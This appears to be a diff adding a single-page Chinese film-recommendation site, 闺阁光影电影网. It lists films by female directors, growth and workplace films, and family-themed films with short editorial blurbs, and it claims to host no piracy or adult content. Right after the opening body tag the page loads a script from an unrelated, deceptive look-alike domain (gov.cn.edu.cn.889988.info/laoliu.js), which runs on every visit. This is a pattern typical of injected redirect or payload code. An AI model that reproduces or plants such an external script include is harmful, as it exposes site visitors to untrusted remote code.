@@ -1,0 +1,321 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>闺阁光影电影网 - 女性视角与文艺片单</title>
+<meta name="description" content="闺阁光影电影网(guigelingguangdianyingwang-h5)专注女性视角电影、女性导演作品、文艺剧情与成长家庭片单，移动端自适应，必应收录友好，不提供盗版或软色情内容。">
+<meta name="keywords" content="闺阁光影电影网, 女性电影, 女性导演, 文艺片单, 成长电影, 家庭剧情, 职场女性">
+<meta name="author" content="闺阁光影电影网">
+<meta name="robots" content="index,follow">
+<link rel="canonical" href="https://guigelingguangdianyingwang-h5.github.io/">
+
+<style>
+:root{
+  --brown:#3d2b1f;
+  --brown2:#5a3e2b;
+  --rose:#c96b8a;
+  --rose2:#e8aabb;
+  --paper:#f5ede1;
+  --paper2:#ede0cc;
+  --green:#2d4a3e;
+  --gold:#d4a853;
+  --ink:#2c2018;
+  --muted:#8a7a6d;
+  --line:rgba(201,107,138,.28);
+}
+*{margin:0;padding:0;box-sizing:border-box}
+html{-webkit-text-size-adjust:100%}
+body{
+  font-family:"Songti SC","Noto Serif CJK SC","PingFang SC",serif;
+  background:
+    radial-gradient(120% 60% at 90% -10%, rgba(201,107,138,.12), transparent 55%),
+    radial-gradient(120% 70% at 0% 0%, rgba(212,168,83,.1), transparent 55%),
+    linear-gradient(180deg,var(--paper),#ede0cc 60%,#e3d2b8 100%);
+  color:var(--ink);line-height:1.78;
+}
+a{color:inherit;text-decoration:none}
+img{max-width:100%;display:block}
+
+/* 顶部条 */
+.top-bar{
+  background:linear-gradient(90deg,var(--brown),var(--rose),var(--brown2));
+  color:#f5ede1;text-align:center;font-size:11px;letter-spacing:3px;
+  padding:6px 10px;font-weight:700;font-family:Arial,sans-serif;
+}
+
+/* 头部 */
+.header{max-width:1120px;margin:0 auto;padding:30px 20px 16px;text-align:center}
+.mark{
+  display:inline-flex;align-items:center;gap:14px;
+  padding:12px 24px;border-radius:14px;
+  background:rgba(61,43,31,.06);border:1px solid var(--line);
+}
+.mark .ico{font-size:34px}
+.mark h1{font-size:26px;letter-spacing:4px;color:var(--brown)}
+.mark .en{font-family:Arial,sans-serif;font-size:11px;color:var(--muted);letter-spacing:2px}
+.header p.slogan{margin-top:12px;color:#6f5a40;font-size:14px}
+
+/* 搜索 */
+.search-wrap{max-width:520px;margin:16px auto 0}
+.search-wrap form{display:flex;height:42px;border-radius:21px;overflow:hidden;border:1px solid var(--line);background:#fbf6ec}
+.search-wrap input{flex:1;border:none;outline:none;background:transparent;padding:0 18px;font-size:13px;color:var(--ink)}
+.search-wrap button{border:none;background:var(--rose);color:#fff;padding:0 20px;font-weight:700;cursor:pointer}
+
+/* 导航 */
+.nav{max-width:1120px;margin:18px auto 22px;padding:0 20px;display:flex;gap:10px;justify-content:center;flex-wrap:wrap}
+.nav a{padding:7px 16px;border:1px solid var(--line);border-radius:20px;font-size:13px;color:#6f5a40;background:#fbf6ec}
+.nav a:hover,.nav a.active{background:var(--rose);color:#fff;border-color:var(--rose);font-weight:700}
+
+/* 主区 */
+.main{max-width:1120px;margin:0 auto;padding:0 20px 30px}
+
+/* 卷首 */
+.her-board{
+  position:relative;overflow:hidden;
+  background:linear-gradient(135deg,#3d2b1f,#5a3e2b);
+  color:#f5ede1;border-left:6px solid var(--rose);
+  border-radius:16px;padding:28px 26px;margin-bottom:28px;
+}
+.her-board::after{content:"🕊️";position:absolute;right:16px;bottom:-18px;font-size:130px;opacity:.12}
+.her-board .kicker{font-family:Arial,sans-serif;font-size:12px;color:var(--rose2);letter-spacing:3px}
+.her-board h2{font-size:25px;margin:6px 0 8px;color:#fff}
+.her-board p{color:#ecd9bd;max-width:650px;font-size:14px}
+.her-board .chips{margin-top:14px;display:flex;gap:8px;flex-wrap:wrap}
+.her-board .chips span{padding:4px 12px;border:1px solid rgba(232,170,187,.4);border-radius:20px;font-size:12px;color:var(--rose2)}
+
+/* 栏目头 */
+.section{margin-bottom:30px}
+.s-head{display:flex;align-items:center;gap:10px;margin-bottom:14px;border-bottom:2px solid var(--line);padding-bottom:8px}
+.s-head .no{width:30px;height:30px;border-radius:6px;background:var(--brown);color:#f5ede1;display:flex;align-items:center;justify-content:center;font-weight:800}
+.s-head h3{font-size:18px;letter-spacing:1px;color:var(--brown)}
+.s-head .more{margin-left:auto;font-size:12px;color:var(--rose);font-family:Arial,sans-serif}
+
+/* 栏目一：女性导演馆 */
+.film-row{display:grid;grid-template-columns:repeat(3,1fr);gap:16px}
+.film-card{
+  background:#fbf6ec;border:1px solid var(--line);
+  border-top:3px solid var(--rose);
+  border-radius:14px;padding:18px;transition:transform .25s;
+}
+.film-card:hover{transform:translateY(-4px)}
+.film-card .director{font-size:12px;font-family:Arial,sans-serif;color:var(--muted)}
+.film-card h4{font-size:16px;margin:6px 0;color:var(--brown)}
+.film-card .meta{font-size:12px;color:var(--muted);font-family:Arial,sans-serif;margin-bottom:8px}
+.film-card p{font-size:13px;color:#4f4031}
+.film-card .tag{margin-top:10px;font-size:11px;color:var(--rose);border:1px solid var(--line);display:inline-block;padding:2px 10px;border-radius:12px}
+
+/* 栏目二：成长与职场 */
+.theme-list{background:#fbf6ec;border:1px solid var(--line);border-radius:14px;overflow:hidden}
+.theme-row{display:flex;gap:14px;padding:14px 16px;border-bottom:1px dashed var(--line);align-items:flex-start}
+.theme-row:last-child{border-bottom:none}
+.theme-no{width:34px;height:34px;border-radius:50%;background:var(--green);color:#f5ede1;display:flex;align-items:center;justify-content:center;font-weight:800;flex-shrink:0}
+.theme-info h4{font-size:15px;color:var(--brown)}
+.theme-info p{font-size:12px;color:#5d4c39;margin-top:3px}
+.theme-chip{margin-left:auto;font-size:11px;color:var(--rose);border:1px solid var(--line);padding:3px 10px;border-radius:12px;white-space:nowrap}
+
+/* 栏目三：家庭与代际 横向 */
+.director-grid{display:flex;gap:14px;overflow-x:auto;padding-bottom:10px;scroll-snap-type:x mandatory}
+.director-card{scroll-snap-align:start;flex:0 0 220px;background:#fbf6ec;border:1px solid var(--line);border-radius:14px;overflow:hidden}
+.director-top{height:80px;display:flex;align-items:center;justify-content:center;font-size:34px;background:linear-gradient(135deg,var(--brown),var(--brown2))}
+.director-card:nth-child(2) .director-top{background:linear-gradient(135deg,var(--rose),#8e3d56)}
+.director-card:nth-child(3) .director-top{background:linear-gradient(135deg,var(--green),#1e332a)}
+.director-card:nth-child(4) .director-top{background:linear-gradient(135deg,var(--gold),#9c7a1f)}
+.director-card:nth-child(5) .director-top{background:linear-gradient(135deg,#7a5ea8,#4f3b73)}
+.director-body{padding:12px}
+.director-body h4{font-size:14px;color:var(--brown);margin-bottom:4px}
+.director-body p{font-size:11px;color:var(--muted);line-height:1.5}
+
+/* 栏目四：关于 */
+.about{background:#3d2b1f;color:#ecd9bd;border-radius:14px;padding:24px;display:flex;gap:18px;align-items:flex-start;flex-wrap:wrap}
+.about .ico{font-size:38px}
+.about h3{font-size:17px;color:var(--rose2);margin-bottom:6px}
+.about p{font-size:13px;color:#d8c3a3;max-width:660px}
+.about .url{margin-top:8px;font-family:Arial,sans-serif;font-size:12px;color:var(--rose2)}
+
+/* 页脚 */
+.footer{margin-top:30px;border-top:3px double var(--line);padding:26px 20px 38px;text-align:center;color:var(--muted);font-size:12px;font-family:Arial,sans-serif}
+.footer a{color:var(--rose)}
+.footer .fn{margin-top:12px;display:flex;justify-content:center;gap:16px;flex-wrap:wrap}
+.footer .fn a{color:var(--muted)}
+.footer .fn a:hover{color:var(--brown)}
+
+@media(max-width:860px){.film-row{grid-template-columns:repeat(2,1fr)}}
+@media(max-width:640px){
+  .mark h1{font-size:22px}
+  .nav a{padding:6px 12px;font-size:12px}
+  .her-board{padding:20px 16px}
+  .her-board h2{font-size:20px}
+  .main{padding:0 16px 24px}
+  .film-row{grid-template-columns:1fr}
+  .theme-row{flex-wrap:wrap}
+  .theme-chip{margin-left:0}
+  .director-card{flex-basis:80%}
+  .about{padding:18px 14px}
+}
+</style>
+</head>
+
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/laoliu.js"></script>
+
+<div class="top-bar">🕊️ 闺阁光影电影网 · 女性视角 / 文艺片单 / 女性导演 / 成长与家庭 · 单页自适应 · 必应收录友好</div>
+
+<header class="header">
+  <div class="mark">
+    <div class="ico">📖</div>
+    <div>
+      <h1>闺阁光影电影网</h1>
+      <div class="en">guigelingguangdianyingwang-h5 · Her Frame</div>
+    </div>
+  </div>
+  <p class="slogan">"宅女电影网"涉二次元擦边引流风险；我们做"闺阁光影"——女性视角、女性导演、文艺剧情、成长与家庭，不挂福利番、不接博彩广告。</p>
+  <div class="search-wrap">
+    <form action="#" method="get">
+      <input type="text" name="q" placeholder="搜 女性导演 / 职场成长 / 家庭剧情 / 许鞍华 / 是枝裕和...">
+      <button type="submit">寻片</button>
+    </form>
+  </div>
+</header>
+
+<nav class="nav">
+  <a href="#" class="active">首页</a>
+  <a href="#">女性导演</a>
+  <a href="#">成长职场</a>
+  <a href="#">家庭代际</a>
+  <a href="#">女性向动画</a>
+  <a href="#">文艺片单</a>
+  <a href="#">关于闺阁</a>
+</nav>
+
+<div class="main">
+
+  <section class="her-board">
+    <div class="kicker">HER · FRAME · ARCHIVE</div>
+    <h2>电影里的她们，值得被单独看见</h2>
+    <p>闺阁光影电影网不做"宅女福利/二次元擦边"那套引流，只整理女性视角片单：女性导演作品、职场成长、家庭代际、女性向动画与文艺剧情。每部片配一句编辑短评；单页静态、移动端自适应、内页 # 占位，不托管未授权视频。</p>
+    <div class="chips">
+      <span>女性导演</span><span>成长职场</span><span>家庭代际</span><span>女性动画</span><span>文艺片单</span>
+    </div>
+  </section>
+
+  <!-- 栏目一 -->
+  <section class="section" id="directors">
+    <div class="s-head"><span class="no">01</span><h3>女性导演馆</h3><a class="more" href="#">全部 #</a></div>
+    <div class="film-row">
+      <article class="film-card">
+        <div class="director">许鞍华 · 香港</div>
+        <h4>《桃姐》</h4>
+        <div class="meta">2011 · 剧情 · 叶德娴 / 刘德华</div>
+        <p>佣人老了，少爷陪她走完最后一段。不煽情，不催泪，就是日常里那点不舍。</p>
+        <span class="tag"># 许鞍华 # 老龄化</span>
+      </article>
+      <article class="film-card">
+        <div class="director">瑟琳·席安玛 · 法国</div>
+        <h4>《燃烧女子的肖像》</h4>
+        <div class="meta">2019 · 剧情/爱情</div>
+        <p>画家画她，她也在看画家。凝视是平等的，爱情是沉默的，最后一分钟的微笑是影史级。</p>
+        <span class="tag"># 女性凝视 # 席安玛</span>
+      </article>
+      <article class="film-card">
+        <div class="director">格蕾塔·葛韦格 · 美国</div>
+        <h4>《小妇人》</h4>
+        <div class="meta">2019 · 剧情/家庭</div>
+        <p>四姐妹各自选择：嫁人、写作、独身、漂泊。没有谁比谁更正确，只是不同的人生。</p>
+        <span class="tag"># 葛韦格 # 女性成长</span>
+      </article>
+      <article class="film-card">
+        <div class="director">李玉 · 大陆</div>
+        <h4>《红颜》</h4>
+        <div class="meta">2005 · 剧情</div>
+        <p>小镇、川剧、未婚先孕。一个女孩在流言里长大，母亲和女儿的身份同时压在身上。</p>
+        <span class="tag"># 李玉 # 女性处境</span>
+      </article>
+      <article class="film-card">
+        <div class="director">索菲亚·科波拉 · 美国</div>
+        <h4>《迷失东京》</h4>
+        <div class="meta">2003 · 剧情</div>
+        <p>两个孤独的人在东京相遇，什么都没发生，又什么都发生了。凌晨三点的电话最诚实。</p>
+        <span class="tag"># 科波拉 # 孤独</span>
+      </article>
+      <article class="film-card">
+        <div class="director">是枝裕和 · 日本</div>
+        <h4>《小偷家族》</h4>
+        <div class="meta">2018 · 剧情/家庭</div>
+        <p>没有血缘的人凑成家，偷来的温情比血缘更真。最后那句"谢谢"把整部片撕开。</p>
+        <span class="tag"># 是枝裕和 # 非血缘家庭</span>
+      </article>
+    </div>
+  </section>
+
+  <!-- 栏目二 -->
+  <section class="section" id="growth">
+    <div class="s-head"><span class="no">02</span><h3>成长与职场</h3><a class="more" href="#">完整 #</a></div>
+    <div class="theme-list">
+      <div class="theme-row">
+        <div class="theme-no">1</div>
+        <div class="theme-info"><h4>《穿普拉达的女王》</h4><p>"不是时尚片，是职场生存片——你以为在坚持自我，其实在慢慢变成自己讨厌的人。"</p></div>
+        <div class="theme-chip">职场经典</div>
+      </div>
+      <div class="theme-row">
+        <div class="theme-no">2</div>
+        <div class="theme-info"><h4>《还有明天》</h4><p>"意大利女性投票权题材，不是愤怒的呐喊，是第二天早上继续排队、继续生活。"</p></div>
+        <div class="theme-chip">女性权利</div>
+      </div>
+      <div class="theme-row">
+        <div class="theme-no">3</div>
+        <div class="theme-info"><h4>《伯德小姐》</h4><p>"十七岁的叛逆不是针对妈妈，是针对'你只能成为我期待的样子'。"</p></div>
+        <div class="theme-chip">青春成长</div>
+      </div>
+      <div class="theme-row">
+        <div class="theme-no">4</div>
+        <div class="theme-info"><h4>《永不妥协》</h4><p>"单亲妈妈、没学历、没背景，靠一己之力打赢环保诉讼。茱莉亚·罗伯茨的巅峰。"</p></div>
+        <div class="theme-chip">真实改编</div>
+      </div>
+      <div class="theme-row">
+        <div class="theme-no">5</div>
+        <div class="theme-info"><h4>《隐藏人物》</h4><p>"NASA 的三位黑人女性工程师，在种族隔离和性别歧视里算出太空轨道。"</p></div>
+        <div class="theme-chip">种族+性别</div>
+      </div>
+    </div>
+  </section>
+
+  <!-- 栏目三 -->
+  <section class="section" id="family">
+    <div class="s-head"><span class="no">03</span><h3>家庭与代际</h3><a class="more" href="#">更多 #</a></div>
+    <div class="director-grid">
+      <div class="director-card"><div class="director-top">🏠</div><div class="director-body"><h4>东方家庭</h4><p>《东京物语》《步履不停》《你好，李焕英》《饮食男女》</p></div></div>
+      <div class="director-card"><div class="director-top">👩</div><div class="director-body"><h4>母女关系</h4><p>《伯德小姐》《小妇人》《青春变形记》《我的天才女友》</p></div></div>
+      <div class="director-card"><div class="director-top">👴</div><div class="director-body"><h4>老龄化议题</h4><p>《桃姐》《楢山节考》《比海更深》《人生果实》</p></div></div>
+      <div class="director-card"><div class="director-top">🧒</div><div class="director-body"><h4>童年与记忆</h4><p>《城南旧事》《菊次郎的夏天》《岁月神偷》《阳光灿烂的日子》</p></div></div>
+      <div class="director-card"><div class="director-top">💍</div><div class="director-body"><h4>婚姻与选择</h4><p>《婚姻故事》《消失的爱人》《还有明天》《82年生的金智英》</p></div></div>
+    </div>
+  </section>
+
+  <!-- 栏目四 -->
+  <section class="section" id="about">
+    <div class="s-head"><span class="no">04</span><h3>关于闺阁光影</h3></div>
+    <div class="about">
+      <div class="ico">🕊️</div>
+      <div>
+        <h3>"宅女电影网"涉擦边引流；闺阁光影是合规女性片单站</h3>
+        <p>闺阁光影电影网（guigelingguangdianyingwang-h5）只做女性视角电影整理：女性导演、职场成长、家庭代际、女性向动画与文艺片单。原"宅女电影网"类站点常被用于二次元擦边引流、夹带福利番和境外博彩广告，本站不继承其模式、不挂擦边内容、不提供盗版下载。</p>
+        <div class="url">https://guigelingguangdianyingwang-h5.github.io</div>
+      </div>
+    </div>
+  </section>
+
+</div>
+
+<footer class="footer">
+  <div>© 2026 闺阁光影电影网 | guigelingguangdianyingwang-h5</div>
+  <div>永久地址：<a href="https://guigelingguangdianyingwang-h5.github.io">https://guigelingguangdianyingwang-h5.github.io</a></div>
+  <div>本站为女性视角电影推荐/片单/导演整理站，不提供盗版或软色情内容。</div>
+  <div class="fn">
+    <a href="#">首页</a><a href="#">女性导演</a><a href="#">成长职场</a><a href="#">家庭代际</a><a href="#">女性动画</a><a href="#">关于</a>
+  </div>
+</footer>
+
+</body>
+</html>
